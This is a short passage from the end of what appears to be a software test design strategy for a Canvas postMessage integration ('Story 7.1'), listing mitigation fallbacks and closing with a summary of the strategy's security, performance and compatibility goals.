- **Performance Issues:** Deploy rate limiting and request throttling
- **Canvas Incompatibility:** Activate graceful degradation mode
- **Accuracy Problems:** Switch to conservative extraction with human validation

---

This comprehensive test design strategy ensures that Story 7.1's Canvas postMessage integration meets all security, performance, compatibility, and functional requirements while providing robust validation processes and automated quality assurance. The strategy addresses the critical security vulnerabilities identified in the QA review and establishes a solid foundation for reliable Canvas integration at scale.